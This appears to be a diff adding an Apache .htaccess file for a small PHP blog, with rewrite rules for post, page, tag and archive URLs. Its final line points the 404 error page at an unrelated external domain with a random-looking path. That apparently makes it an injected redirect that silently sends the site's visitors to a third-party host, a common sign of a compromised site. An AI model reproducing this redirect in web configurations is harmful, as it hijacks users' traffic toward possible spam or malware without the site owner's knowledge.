@@ -1,0 +1,15 @@
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+
+
+
+RewriteRule ^post/([^/\.]+)?$ index.php?post=$1
+RewriteRule ^pages/([^/\.]+)?$ index.php?page=$1
+RewriteRule ^tagged/([^/\.]+)?$ tagged.php?t=$1
+RewriteRule ^archive/([^/\.]+)?$ archive.php?skip=$1
+
+RewriteRule ^(([^/]+/)*[^.]+)$ /$1.php
+
+ErrorDocument 404 http://heapstore.ru/serrwtet
